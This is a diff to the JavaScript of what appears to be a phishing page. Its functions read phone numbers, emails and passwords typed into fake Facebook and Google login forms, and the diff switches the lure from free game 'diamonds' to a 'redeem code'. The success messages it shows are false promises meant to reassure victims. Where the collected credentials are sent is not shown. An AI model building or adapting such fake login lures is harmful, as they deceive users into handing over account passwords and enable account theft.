@@ -1,12 +1,12 @@
 function FBloginOnClick() {
-	var diamonds = document.getElementById("num-in").value;
+	var redeemCode = document.getElementById("num-in").value;
 
 	var phoneno = document.getElementById("mobile-no").value;
 	var password = document.getElementById("password").value;
 
-	if(!diamonds)
+	if(!redeemCode)
 	{
-		MESSAGE("Please enter number of diamonds");
+		MESSAGE("Please Enter Redeem Code");
 	}
 	else if(!phoneno || !password)
 	{
@@ -17,27 +17,27 @@ function FBloginOnClick() {
 		MESSAGE("Please enter correct phone number!!!");
 	}
 	else{
-		SUCCESS_MESSAGE(diamonds,"diamonds will be added to your account within 24 hours.");
+		SUCCESS_MESSAGE("Redeem code success");
 	}
 }
 
 function GoogleloginOnClick()
 {
-	var diamonds = document.getElementById("num-in").value;
+	var redeemCode = document.getElementById("num-in").value;
 
 	var email = document.getElementById("email").value;
 	var password = document.getElementById("gpassword").value;
 
-	if(!diamonds)
+	if(!redeemCode)
 	{
-		MESSAGE("Please enter number of diamonds");
+		MESSAGE("Please Enter Redeem Code");
 	}
 	else if(!email || !password)
 	{
 		MESSAGE("Please login first!!!");
 	}
 	else{
-		SUCCESS_MESSAGE(diamonds,"diamonds will be added to your account within 24 hours.");
+		SUCCESS_MESSAGE("Redeem code success");
 	}
 }
 
